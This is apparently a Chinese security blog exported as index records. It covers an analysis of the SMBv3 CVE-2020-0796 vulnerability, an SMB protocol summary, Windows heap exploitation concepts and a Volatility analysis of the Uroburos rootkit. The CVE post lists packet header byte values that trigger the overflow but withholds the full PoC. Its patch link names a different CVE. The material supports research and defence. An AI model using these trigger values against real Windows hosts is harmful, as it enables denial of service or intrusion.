考虑到PoC尚未大范围传播，此处不放出完整代码，只对关键代码进行解释： // 设置头部 \\xfc\\x53\\x4d\\x42 // 设置OriginalCompressedSegmentSize字段，此值为多少，后续就要跟多少填充数据 \\x32\\x00\\x00\\x00 // 设置CompressionAlgorithm字段，确定使用的压缩算法 \\x01\\x00 // 设置Flags字段 \\x00\\x00 // 设置Offset/Length字段 \\xff\\xff\\xff\\xff 其中主要的是要OriginalCompressedSegmentSize + Offset/Length 可以产生溢出，所以这两个字段的值可以更改，最终使用的是两个字段的和。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:4","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"5. 更新后的srv2.sys文件 主要是对Srv2DecompressData函数进行了更新，添加了一些数据长度的检查。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:5","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"6. 流量分析 使用两个不同的PoC造成的蓝屏的流量截图如下： 设置Offset/Length字段为ffffffff 设置OriginalCompressedSegmentSize字段为ffffffff： ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:6","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"7. 漏洞防御策略 熟悉了漏洞原理后，可以在流量测进行防御，比如使用Snort的byte_math关键字判断两个字段的和是否会发生整数溢出，发生了证明可能存在恶意流量。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:4:7","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"四、缓解措施及安全更新 缓解措施：使用以下PowerShell命令禁用SMBv3压缩功能 Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 1 -Force 使用下面的命令解禁用SMBv3压缩功能 Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 0 -Force 考虑到该漏洞影响较广，且crash的PoC已经公开，强烈建议及时安装官方安全补丁，补丁链接如下： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0618 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:5:0","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"五、备注 网上看到一些大佬的分析，定位到了压缩算法里的漏洞，本人能力有限，可能没有分析足够透彻，望包涵。 ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:6:0","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Vuln"],"content":"六、参考链接 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0#Appendix_A_Target_69 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/78e0c942-ab41-472b-b117-4a95ebe88271 http://blogs.360.cn/post/CVE-2020-0796.html https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html https://www.fortinet.com/blog/threat-research/cve-2020-0796-memory-corruption-vulnerability-in-windows-10-smb-server.html ","date":"2020-01-14","objectID":"/2020/01/cve-2020-0796/:7:0","tags":["漏洞"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/01/cve-2020-0796/"},{"categories":["Windows"],"content":"SMB 协议简单总结","date":"2019-12-24","objectID":"/2019/12/smb/","tags":["SMB"],"title":"SMB 协议简单总结","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"SMB协议简单总结 ","date":"2019-12-24","objectID":"/2019/12/smb/:0:0","tags":["SMB"],"title":"SMB 协议简单总结","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"SMB协议 ","date":"2019-12-24","objectID":"/2019/12/smb/:1:0","tags":["SMB"],"title":"SMB 协议简单总结","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"一. Client和Server的连接过程 client和server首先建立NetBIOS session clent和server确定使用的smb协议的dialect（定义了特定协议版本的消息包集） client登录到server client连接server上的一个share client在share中打开文件 client开始读取文件 client和server首先要建立全双工的TCP连接，然后client建立并发送一个NetBIOS session请求包。 如果请求包格式化正确，server返回一个包含着确认session建立成功的消息包。然后，client 开始想server发送第一个smb协议数据包。 ","date":"2019-12-24","objectID":"/2019/12/smb/:1:1","tags":["SMB"],"title":"SMB 协议简单总结","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"二. SMB协议涉及到的数据包分析 Packet1. SMB_COM_NEGOTIATE Direction:C-\u003eS\rDescription:client想server发送smb dialect的确认信息，server返回一个包含着dialects\r的字符串的数据包。\rPacket2. SMB_COM_NEGOTIATE Direction:S-\u003eC\rDescription:server相应client的请求，确定将在session中使用的smb dialect。server返回\r的数据包中还包括一个8字节的随机字符串，该字符串将在系一部中用于在登录过程中对客户端\r进行身份验证。\rPacket3. SMB_COM_SESSION_SETUP_ANDX Direction:C-\u003eS\rDescription:该数据包包含着有关client功能的信息，因此即使server实现了share-level\rsecurity model，也必须要发送该数据包。\rPacket4. SMB_COM_SESSION_SETUP_ANDX Direction:S-\u003eC\rDescription:如果server接受了challenge/response，则返回给client的数据包中将包含\r一个有效的UID。如果不接受，则在数据包中返回error code，并拒绝访问。\rPacket5. SMB_COM_TREE_CONNECT_ANDX Direction：C-\u003eS\rDescription:client对share发起访问，该数据包中包含UNC格式的绝对共享路径。\rPacket6. SMB_COM_TREE_CONNECT_ANDX Direction:S-\u003eC\rDescription:如果server授予了client访问权限，则server返回与该数据包中的share对应的\r16位的TID。如果share不存在或者client没有足够的权限，则server返回error code并拒绝访问。\rPacket7. SMB_COM_OPEN_ANDX Direction:C-\u003eS\rDescription:client请求server代表自己在share中打开文件，该数据包中包含要打开的文件的名称。\rPacket8. SMB_COM_OPEN_ANDX Direction:S-\u003eC\rDescription:如果授予了对文件的访问权限，则server返回请求文件的ID；如果文件不存在或者\r用户没有足够的权限访问该文件，则返回error code并拒绝client的访问。\rPacket9. SMB_COM_READ_ANDX Direction:C-\u003eS\rDescription:client请求server代替自己读取文件中的数据并返回给自己。打开文件时client\r获取的文件ID包含在该数据包中，以便识别server应该从哪个打开的文件中读取数据。\rPacket10. SMB_COM_READ_ANDX Direction:S-\u003eC\rDescription：server返回client请求的文件数据。由于已授予对server，share和文件的访问\r权限，一般不会出现问题。但是在某些特殊情况下会发生错误，例如在打开文件和从文件中读取数据\r这两步之间，对share的访问权限遭到了更改，就会发生错误。\r","date":"2019-12-24","objectID":"/2019/12/smb/:1:2","tags":["SMB"],"title":"SMB 协议简单总结","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"三. SMB Message结构 SMB Message包括一个固定长度的header（32字节）、一个可变长度的Parameter block（最大\r为64kb）、一个可变长度的Data block。\rThe SMB Message Header 32字节的固定长度。\rSMB_Header\r{\rUCHAR Protocol[4];\rUCHAR Command;\rSMB_ERROR Status;\rUCHAR Flags;\rUSHORT Flags2;\rUSHORT PIDHigh;\rUCHAR SecurityFeatures[8];\rUSHORT Reserved;\rUSHORT TID;\rUSHORT PIDLow;\rUSHORT UID;\rUSHORT MID;\r}\r简单说一下比较重要的部分：\rProtocol:(4 字节)需要包含\"\\xff\",“S”,“M”,“B” Flags2:保留位必须设置为0，且需要重点关注SMB_FLAGS2_DFS字段，如果该位被设置为1，则任何的文件路径名都应该在DFS中进行处理（这也是很多漏洞触发点，因为对于文件路径规范化处理函数，有漏洞） SecuritySignature (8 bytes): 如果已协商SMB签名，则此字段必须包含一个8字节的加密消息签名，可用于检测消息是否在传输过程中被修改。 消息签名的使用与无连接传输是互斥的。 Parameter Block 在CIFS方言中，SMB_Parameters.Words数组可以包含任意结构。 SMB_Parameters.Words结构的格式是针对每个命令消息单独定义的。 Words数组的大小仍然被测量为字节对的计数。其结构如下所示： SMB_Parameters\r{\rUCHAR WordCount;\rUSHORT Words[WordCount] (variable);\r}\rWords (variable): The message-specific parameters structure. The size of this field MUST be (2 x WordCount) bytes. If WordCount is 0x00, this field is not included. Data Block 结构与Parameter Block相似：\rSMB_Data\r{\rUSHORT ByteCount;\rUCHAR Bytes[ByteCount] (variable);\r}\rBatched Message(AndX Messages) 主要是为了在一个message中发送多个request或者response command，而只需要一个smb header即可。\rIn AndX Messages, only one SMB Header (section 2.2.3.1) is sent. The header is then followed by zero or more Parameter and Data block pairs, each corresponding to an additional command request/response. There is no limit on the number of block pairs in a message specifically, only on the total message size. *The total size of a Batched Message MUST NOT exceed the negotiated MaxBufferSize.* AndX Messages contain a construct, conceptually similar to a linked-list, that is used to connect the batched block pairs. The resulting list is referred to as an AndX Chain.\r其结构如下：\rAndX\r{\rUCHAR AndXCommand;\rUCHAR AndXReserved;\rUSHORT AndXOffset;\r}\rAndXOffset (2 bytes): The offset in bytes, relative to the start of the SMB Header, of the next Parameter block in the AndX Message. This offset is independent of any other size parameters or offsets within the command. This offset can point to a location past the end of the current block pair. The AndX construct is located at the start of the Parameter block of an AndX command request/response. ","date":"2019-12-24","objectID":"/2019/12/smb/:2:0","tags":["SMB"],"title":"SMB 协议简单总结","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"四. SMB COMMANDS 由于commands数量较多，此处给出微软官方的命令解释地址。\r[Microsoft Docs]: \u003chttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/5cd5747f-fe0b-40a6-89d0-d67f751f8232\u003e\r​ ","date":"2019-12-24","objectID":"/2019/12/smb/:3:0","tags":["SMB"],"title":"SMB 协议简单总结","uri":"/2019/12/smb/"},{"categories":["Windows"],"content":"Windows Heap 知识总结","date":"2019-11-24","objectID":"/2019/11/windows-heap/","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"Windows Heap 漫游 在系统安全研究中，堆，是一个极其重要的内存区域以及研究的热点。堆，区别于栈区、全局数据区以及代码区，它的主要作用是允许程序在运行时动态地申请某个大小的内存空间。本文将从宏观到微观，简单梳理总结一下Windows系统中的堆相关的知识以及常见的堆利用漏洞，方便自己后续的学习。 Windows堆的历史 到目前为止，由于微软并没有完全公开Windows中堆管理的细节，所以现在对Windows下堆的了解都是基于技术爱好者、黑客、安全专家以及逆向工程师等的个人研究成果。这些前辈的努力工作，为我们留下了极其宝贵的研究资料。现在，我们已经可以基本清楚了部分Windows系统中的堆管理策略、与攻击相关的数据结构和算法等。此处，有几位技术精湛、贡献卓越的前辈值得我们铭记： Halvar Flake：2002年的Black Hat大会上，他在演讲“Third Generation Exploitation”中首次挑战Windows的堆溢出，并揭秘了堆中一些重要的数据结构和算法。 David Litchfield: David 在2004年的Black Hat上演讲的\"Windows Heap Overflows\"首次比较全面地介绍了Windows 2000平台下堆溢出地技术细节，包括重要数据结构、堆分配算法、利用思路、劫持进程地方法、执行shellcode时会遇到的问题等。 Matt Conover: 在其演讲的\"XP SP2 Heap Exploitation\"中全面揭示了Windows堆中与溢出相关的所有数据结构和分配策略，而且还提出了突破Windows XP SP2平台下诸多安全机制的防护进行堆溢出的方法。 Windows堆的数据结构与管理机制 堆不同于栈，其管理机制错综繁杂，操作系统一般会直接提供一套API来将底层的复杂的堆管理屏蔽掉。程序员在使用堆时可以只做三件事：申请一定大小的内存、使用内存、释放内存。 虽然对于程序员来说，对堆的操作变得简单，但是对于堆管理系统来说，需要有一套完善的机制来响应程序的内存使用申请，这意味着需要在“杂乱”的堆区中“寻找”到“合适”的、空闲的内存区域，以指针形式返回给程序。 “杂乱”：堆区在经过反复的申请、释放操作后，原本大片连续的空闲内存区域可能变得支离破碎，呈现出大小不等且空闲块、占用块相间隔的凌乱状态。 “寻找”：堆管理程序必须能够在“杂乱”的堆内存区域中找到程序申请的堆内存块，寻找过程中需要辨别哪些堆块是正在使用的，哪些堆块是已经释放的，处于空闲状态的。 “合适”：堆管理程序需要按需分配堆内存，不能过大也不能不够，需要“恰到好处”。 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:0:0","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"堆中的数据结构 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:1:0","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"堆块 传统内存统计单位往往是以字节位标准，但处于性能的考虑，堆内存按照大小不同组成不同的块，以堆块为单位进行标识。一个堆块包括两个部分：header部分和data部分。header是一个堆块头部的几个字节，用来标识这个堆块自身的信息。data是用来在最终分配给用户使用的数据区。\r","date":"2019-11-24","objectID":"/2019/11/windows-heap/:1:1","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"堆表 为了合理地组织堆区中的空闲堆块，提出了堆表的概念。堆表的数据结构决定了整个堆区的组织方式，一般位于堆区的起始位置，用于索引堆区中空闲堆块的重要信息，包括堆块的位置、大小、状态（空闲or占用）。\r下图是一个简单的堆内存组织图：\r堆表并不索引所有的堆块。在Windows系统中，处于占用态的堆块由正在使用它的程序索引，处于空闲态的堆块由堆表索引。空闲的堆块大小不一，而且其使用频率不定。可能较小的堆块的使用频率更高，较大的使用频率较低，这需要对这两种情况进行不同的索引方式以提高效率。该问题主要通过不同类型的堆表进行解决，其中，最重要的堆表有两种：空闲双向链表Freelist和快速单向链表Lookaside。\r1. 空闲双向链表Freelist 顾名思义，它是一个双向链表。在空闲堆块的header中有一对指针，用于将空闲堆块链接成双向链表。而且，在该双向链表中，根据堆块的大小不同，一共被分成了128条。 对于这128条链表的组织，由堆区一开始的堆表区中的一个有128项的指针数组索引，称为Freelist arrary。该数组的每一项都包含两个指针，用于标识一条空闲双向链表。其结构如下所示： 从上面空闲双向链表结构图中我们可以清晰地看到它的内部结构。第二项索引free[1]标识了堆区中所有大小为8字节的空闲堆块，第三项索引free[2]标识了堆区中所有大小为16字节的空闲堆块，之后的每各索引项标识堆区中的空闲堆块都逐次递增8字节，最后一个索引项free[127]标识的堆块的大小为1016字节。由以上数据，我们可以得到空闲堆块大小与索引项之间的对应关系： 空闲堆块大小 = 索引项 * 8 （单位：字节） 将不同大小的空闲堆块放入不同的空闲双向链表中就可以方便、高效地对堆区中不同大小的空闲堆块进行管理，也可以提高检索效率。 需要额外注意的是，上图中的第一个索引项free[0]，该链表索引的空闲堆块的大小不满足上面的公式，该索引项中链接的空闲堆块的大小都大于等于1024字节（小于512KB），这些空闲堆块按照升序在free[0]链表中依次排列。 2. 快速单向链表Lookaside 与Freelist不同，Lookaside是一个单向链表，这是Windows为了加速堆块分配而采用的一种堆表。Lookaside中的空闲堆块从来不会发生堆块合并（其中的空闲堆块header被设置为占用态，以防止堆块合并），因此可以大大提高堆块分配的速度。 Lookaside一共有128项，每一项索引的空闲堆块都以单链表的形式进行组织。其结构如下图所示： 此外，Lookaside还有一个特殊的特点，它总是被初始化为空，而且每条Lookaside最多只有4个节点。 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:1:2","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"堆中的堆块操作 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:2:0","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"1. 堆块分配 堆块的分配可以分为三类，Lookaside分配、普通Freelist分配以及0号Freelist（free[0]）分配。 Lookaside分配: 寻找到大小匹配的空闲堆块 -\u003e 修改状态为占用 -\u003e 从堆表中解链 -\u003e 给程序返回一个指向堆块的指针 普通Freelist分配： 寻找最优的空闲堆块 -\u003e 若失败，寻找次优空闲堆块分配 0号Freelist分配： 从free[0]反向寻找最后一个堆块（最大的堆块） -\u003e 若满足要求，再正向搜索最小的满足要求的空闲堆块 堆块分配中的“找零钱”现象： 当在Freelist中无法找到刚好合适的堆块时，此时会分配一个稍微大一点的空闲堆块给程序使用，其过程是首先在这个大块中分配出大小刚好等于请求堆块大小的堆块给程序，然后剩下的部分修改堆块的header信息，重新链入到Freelist合适的位置。这种方法节约了内存的使用，不会造成大量的内存浪费。 由于Lookaside只有在精确匹配时才会分配，因此不存在“找零钱”现象。 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:2:1","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"2. 堆块释放 堆块的释放主要是将堆块修改为空闲状态，然后将堆块链入相应的堆表。所有的释放块都链入堆表的末尾，分配的时候也会首先从堆表末尾分配。 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:2:2","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"3. 堆块合并 为了减少内存中的内存碎片，合理有效地利用内存，堆管理系统还需要进行堆块合并操作。当两个空闲堆块彼此相邻的时候就会进行堆块合并操作。其过程大致为： 将两个块从Freelist中解链 -\u003e 合并堆块 -\u003e 调整合并后堆块的header信息 -\u003e 将合并后的堆块放入Freelist合适的位置 Windows堆分配函数 Windows平台下的堆管理架构可以用下图来概述： 在Windows系统中，提供了许多类型的堆分配函数，大部分函数都可以在微软的官方文档中找到详细说明。各个函数之间调用关系如下图所示： 从上图中我们可以看到，虽然Windows中关于堆分配的函数有很多，但是各个函数最终都要使用RtlAllocateHeap()函数进行分配，该函数位于ntdll.dll文件中。或者可以换个角度看待这个问题，只要研究清楚了该函数，即可研究清楚Windows中的堆。 常见Windows堆漏洞类型 Windows平台下的堆管理机制与Linux平台下的堆管理机制虽然有不同的地方，但在漏洞利用方面，经常见到的漏洞类型大同小异，可能在漏洞利用的细节上不同。以下将简单介绍一下常见的堆漏洞类型以及比较经典的Windows堆漏洞。\r","date":"2019-11-24","objectID":"/2019/11/windows-heap/:2:3","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"1. 堆溢出漏洞 堆溢出与栈溢出在本质上是相通的，都是精心构造特制的数据去覆盖正常数据，覆盖到某个特定位置后跳转到自己的shellcode的地址去执行shellcode。但从技术层面来讲，堆溢出比栈溢出难度更大。而且现在基本很少有软件存在典型的栈溢出漏洞，相反由于堆的复杂性，很多软件仍然存在诸多的堆溢出漏洞。 堆溢出利用的核心是使用精心构造的数据去溢出下一个堆块的header部分，修改堆块中的两个指针：前向指针(flink)和后向指针(blink)，这样的操作会导致在堆块进行分配、合并、释放等操作时出现异常，攻击者可以在这三个操作的过程中寻找到向内存任意地址读写任意数据的机会，从而实现堆溢出攻击，在《0 day安全：软件漏洞分析技术》中，这种机会被称为\"DWORD SHOOT\"。 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:3:0","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"2. UAF漏洞 Use After Free（UAF），释放后重引用漏洞， 一块内存已经被释放后，在程序中仍然存在对该块内存的引用，并且在一定情况下可能使用内存中的数据。由于这块原本已经被释放不应该再使用的内存被程序中的其他地方进行了使用，因此该块内存中的数据是不可信的。这种方式甚至会造成内存崩溃或者任意代码执行。此类型的漏洞在浏览器中比较常见。 UAF漏洞比较有名的是CVE-2013-1347 Microsoft IE CGenericElement UAF漏洞，该漏洞被用在了当时著名的“水坑”事件中，影响巨大。 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:4:0","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["Windows"],"content":"3. Double Free漏洞 双重释放漏洞，主要是由于对同一块内存进行二次重复释放。在释放过程中，邻近的已释放的堆块存在合并动作，这会导致原有的堆header信息发生改变，同时前向指针和后向指针也会发生改变，随后再对其中的地址进行引用，就会导致访问异常，最终导致程序崩溃或者任意代码执行。从另外一个角度来说，由于发生了对释放后的堆块内存的引用，因此Double Free漏洞也是UAF漏洞的一个子集。 双重释放漏洞比较经典的是CVE-2014-1767，该漏洞位于Windows AFD.sys文件中。在2014年的Pwn2Own上，Siberas团队使用该漏洞进行内核提权，绕过了Windows 8.1平台上的IE11沙箱，并在随后获得了Pwnie Awards的“最佳提权漏洞奖”。该漏洞通杀Windows系统，影响较大。 参考文献 《0 day安全：软件漏洞分析技术》 《漏洞战争：软件分析精要》 ","date":"2019-11-24","objectID":"/2019/11/windows-heap/:5:0","tags":["Windows"],"title":"Windows Heap 漫游","uri":"/2019/11/windows-heap/"},{"categories":["LINUX"],"content":"Uroburos Rootkit分析","date":"2019-10-24","objectID":"/2019/10/rootkit/","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"Uroburos Rootkit Analyse Uroburos Rootkit中的HOOK的简单分析以及驱动的提取 Uroburos是一个rootkit，由两个文件，一个驱动程序和一个加密的虚拟文件系统组成。它可以窃取信息（最著名的是：文件），还可以捕获网络流量。它的模块化结构使其可以轻松扩展新功能，这不仅使其非常复杂，而且具有很高的灵活性和危险性。Uroburos的驱动程序部分非常复杂，并且设计得非常离散且很难识别。 本文章的分析基于BAE Systems的report以及spresec的博客，使用的样本为626576e5f0f85d77c460a322a92bb267，使用的主要工具为volatility（rekall也可以）。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:0:0","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"Hook分析 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:0","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"查找函数hook 根据BAE Systems的report，该rootkit对IoCreateDevice()函数进行了hook。我们通过一个受该rootkit映像的image来对该hook进行分析。 使用volatility的enumfunc插件来列举出所有导出函数的内存地址： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.vmem --profile=WinXPSP3x86 enumfunc -K -E | grep IoCreateDevice Volatility Foundation Volatility Framework 2.3.1 \u003cKERNEL\u003e Export ntoskrnl.exe 340 0x000000008056aad6 IoCreateDevice 使用volshell来查看该函数是如何被hook的： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos_mod.vmem --profile=WinXPSP3x86 volshell Volatility Foundation Volatility Framework 2.3.1 Current context: process System, pid=4, ppid=0 DTB=0x334000 Welcome to volshell! Current memory image is: ./uroburos_mod.vmem To get help, type 'hh()' \u003e\u003e\u003e dis(0x000000008056aad6) 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 0x8056aae1 a140ae5480 MOV EAX, [0x8054ae40] 0x8056aae6 8945fc MOV [EBP-0x4], EAX 从上面的结果可以看出，0x1被压入栈中，然后INT 0xc3执行一个中断。我们进一步跟进这个中断，看一下它的具体信息。 使用idt查看一下IDT： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.mem --profile=WinXPSP3x86 idt Volatility Foundation Volatility Framework 2.3.1 CPU Index Selector Value Module Section ------ ------ ---------- ---------- -------------------- ------------ [snip] 0 BC 0x8 0x8053d0b8 ntoskrnl.exe .text 0 BD 0x8 0x8053d0c2 ntoskrnl.exe .text 0 BE 0x8 0x8053d0cc ntoskrnl.exe .text 0 BF 0x8 0x8053d0d6 ntoskrnl.exe .text 0 C0 0x8 0x8053d0e0 ntoskrnl.exe .text 0 C1 0x8 0x806d1984 hal.dll .text 0 C2 0x8 0x8053d0f4 ntoskrnl.exe .text 0 C3 0x8 0x896a3670 UNKNOWN 0 C4 0x8 0x8053d108 ntoskrnl.exe .text 0 C5 0x8 0x8053d112 ntoskrnl.exe .text 0 C6 0x8 0x8053d11c ntoskrnl.exe .text 0 C7 0x8 0x8053d126 ntoskrnl.exe .text 0 C8 0x8 0x8053d130 ntoskrnl.exe .text [snip] 在上面的结果中，我们可以发现，INT 0xc3处理的中断位于一个名为“UNKNOWN”的模块中。无法正确识别出来这是不是系统模块，说明确实有问题。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:1","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"修改volatility的apihooks插件 通过前面几步操作，我们可以确认hook的地址。但是需要更多的信息，最好是能看到hook的具体操作内容和流程。因为volatility的原生apihooks.py是不支持内联中断hook的，所以需要对原生插件做一个改进。 原生apihooks.py中有个check_inline()函数，可以看到其代码是典型的内联hook的逻辑，该内联hook在当前模块，无条件的jmps，push/ret等的外部寻找调用。不幸的是，该rootkit没有使用任何这些方法。 在修改了一些代码之后，添加了以下逻辑来处理内联中断hook： elif op.flowControl == \"FC_INT\" and idt: # Clear the push value if push_val: push_val = None # Check for INT, ignore INT3 if op.mnemonic == \"INT\" and op.size \u003e 1 and op.operands[0].type == 'Immediate': # Check interrupt handler address d = idt[op.operands[0].value] if d and outside_module(d): break 将修改后的插件合入volatility，然后重新运行： $ python2 /opt/volatility-2.3.1/vol.py -f uroburos.vmem --profile=WinXPSP3x86 apihooks -P Volatility Foundation Volatility Framework 2.3.1 ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IoCreateDevice at 0x8056aad6 Hook address: 0x896a3670 Hooking module: \u003cunknown\u003e Disassembly(0): 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 0x8056aae1 a140ae5480 MOV EAX, [0x8054ae40] 0x8056aae6 8945fc MOV [EBP-0x4], EAX 0x8056aae9 8b4508 MOV EAX, [EBP+0x8] 0x8056aaec 89 DB 0x89 0x8056aaed 45 INC EBP Disassembly(1): 0x896a3670 90 NOP 0x896a3671 90 NOP 0x896a3672 90 NOP 0x896a3673 90 NOP 0x896a3674 90 NOP 0x896a3675 90 NOP 0x896a3676 90 NOP 0x896a3677 90 NOP 0x896a3678 90 NOP 0x896a3679 90 NOP 0x896a367a 90 NOP 0x896a367b 90 NOP 0x896a367c 90 NOP 0x896a367d 90 NOP 0x896a367e 90 NOP 0x896a367f 90 NOP 0x896a3680 6a08 PUSH 0x8 0x896a3682 6888366a89 PUSH DWORD 0x896a3688 0x896a3687 cb RETF ************************************************************************ Hook mode: Kernelmode Hook type: Inline/Trampoline Victim module: ntoskrnl.exe (0x804d7000 - 0x806cf580) Function: ntoskrnl.exe!IofCallDriver at 0x804ee120 Hook address: 0x896a3670 Hooking module: \u003cunknown\u003e Disassembly(0): 0x804ee120 6a00 PUSH 0x0 0x804ee122 cdc3 INT 0xc3 0x804ee124 90 NOP 0x804ee125 90 NOP [snip] ok，这次没有问题了。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:2","tags":["rootkit"],"title":"Uroburos Rootkit分析","uri":"/2019/10/rootkit/"},{"categories":["LINUX"],"content":"Hook的详细分析 到现在为止，我们可以跟深入跟踪处理hook的指令进行更详细的分析了。重新使用volshell插件来看一下处理IoCreateDevice()的hook的具体函数： \u003e\u003e\u003e dis(0x000000008056aad6, 0xb) 0x8056aad6 6a01 PUSH 0x1 0x8056aad8 cdc3 INT 0xc3 0x8056aada 90 NOP 0x8056aadb 81ec90000000 SUB ESP, 0x90 \u003e\u003e\u003e dis(0x896a3670, 0x18) 0x896a3670 90 NOP 0x896a3671 90 NOP 0x896a3672 90 NOP 0x896a3673 90 NOP 0x896a3674 90 NOP 0x896a3675 90 NOP 0x896a3676 90 NOP 0x896a3677 90 NOP 0x896a3678 90 NOP 0x896a3679 90 NOP 0x896a367a 90 NOP 0x896a367b 90 NOP 0x896a367c 90 NOP 0x896a367d 90 NOP 0x896a367e 90 NOP 0x896a367f 90 NOP 0x896a3680 6a08 PUSH 0x8 0x896a3682 6888366a89 PUSH DWORD 0x896a3688 0x896a3687 cb RETF \u003e\u003e\u003e dis(0x896a3688, 0x29) 0x896a3688 fb STI 0x896a3689 50 PUSH EAX 0x896a368a 51 PUSH ECX 0x896a368b 0fb6442414 MOVZX EAX, BYTE [ESP+0x14] 0x896a3690 8b4c2418 MOV ECX, [ESP+0x18] 0x896a3694 894c2414 MOV [ESP+0x14], ECX 0x896a3698 8b0d506c6c89 MOV ECX, [0x896c6c50] 0x896a369e 8d04c1 LEA EAX, [ECX+EAX*8] 0x896a36a1 8b4804 MOV ECX, [EAX+0x4] 0x896a36a4 894c2418 MOV [ESP+0x18], ECX 0x896a36a8 59 POP ECX 0x896a36a9 8b00 MOV EAX, [EAX] 0x896a36ab 870424 XCHG [ESP], EAX 0x896a36ae c20c00 RET 0xc \u003e\u003e\u003e dd(0x896c6c50, 1) 896c6c50 89a2d800 \u003e\u003e\u003e dd(0x89a2d800+1*8, 1) 89a2d808 8963a020 \u003e\u003e\u003e dis(0x8963a020, 0xb) 0x8963a020 55 PUSH EBP 0x8963a021 8bec MOV EBP, ESP 0x8963a023 83ec18 SUB ESP, 0x18 0x8963a026 e875fd0100 CALL 0x89659da0 现在我们找到了处理hook的详细的函数代码，我们可以将内存导出，然后使用IDA进行分析。 ","date":"2019-10-24","objectID":"/2019/10/rootkit/:1:3","tags":["rootkit"],"title":"Uroburos 